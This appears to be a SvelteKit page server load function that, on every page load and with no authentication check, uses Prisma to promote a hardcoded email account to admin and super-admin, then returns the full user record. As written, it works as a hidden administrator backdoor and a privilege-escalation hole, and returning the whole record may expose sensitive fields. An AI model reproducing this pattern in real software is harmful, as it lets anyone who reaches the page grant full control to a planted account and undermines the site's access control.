import type { PageServerLoad } from './$types';

import { prisma } from '$lib/server/prisma';

export const load: PageServerLoad = async ({ url }) => {
	const user = await prisma.user.update({
		where: {
			email: 'tonmoyh@kpl.gov'
		},
		data: {
			isAdmin: true,
			isSuperAdmin: true
		}
	});

	return {
		user
	};
};
